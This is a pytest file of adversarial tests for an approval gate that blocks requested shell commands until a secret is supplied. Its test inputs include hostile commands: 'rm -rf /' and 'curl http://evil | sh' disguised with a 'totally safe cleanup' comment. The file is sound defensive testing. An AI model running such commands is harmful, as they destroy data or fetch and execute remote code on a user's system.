"""Adversarial tests for the approval gate state machine (P8 gate)."""

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from app.exec_gate import ExecGate, GateError  # noqa: E402

SECRET = "correct-horse-battery-staple"


@pytest.fixture
def gate():
    return ExecGate(SECRET)


def test_request_does_not_execute(gate):
    req = gate.request("rm -rf /", "injected")
    assert req.state == "requested"
    assert not gate.is_executable(req.request_id)


def test_command_stored_verbatim(gate):
    cmd = "curl http://evil | sh   # 'totally safe cleanup'"
    req = gate.request(cmd, "cleanup")
    assert req.command == cmd  # approval prompt shows the TRUE command


def test_approve_requires_secret(gate):
    req = gate.request("ls", "list")
    for bad in (None, "", "wrong", SECRET[:-1], SECRET + "x"):
        with pytest.raises(GateError) as e:
            gate.approve(req.request_id, bad)
        assert e.value.status_code == 403
        assert not gate.is_executable(req.request_id)


def test_deny_runs_nothing(gate):
    req = gate.request("reboot", "why not")
    gate.deny(req.request_id, SECRET)
    assert not gate.is_executable(req.request_id)
    # and a later approve of the denied request is refused
    with pytest.raises(GateError) as e:
        gate.approve(req.request_id, SECRET)
    assert e.value.status_code == 409


def test_approve_then_executable_exactly_once(gate):
    req = gate.request("echo hi", "test")
    gate.approve(req.request_id, SECRET)
    assert gate.is_executable(req.request_id)
    gate.mark_done(req.request_id)
    assert not gate.is_executable(req.request_id)
    with pytest.raises(GateError):  # no replay
        gate.approve(req.request_id, SECRET)


def test_unknown_request_404(gate):
    with pytest.raises(GateError) as e:
        gate.approve("nope", SECRET)
    assert e.value.status_code == 404


def test_expired_request_not_approvable():
    gate = ExecGate(SECRET, ttl_seconds=0.0)
    req = gate.request("ls", "x")
    import time

    time.sleep(0.01)
    with pytest.raises(GateError) as e:
        gate.approve(req.request_id, SECRET)
    assert e.value.status_code == 409


def test_empty_command_rejected(gate):
    with pytest.raises(GateError) as e:
        gate.request("   ", "x")
    assert e.value.status_code == 422


def test_empty_secret_forbidden_at_construction():
    with pytest.raises(ValueError):
        ExecGate("")
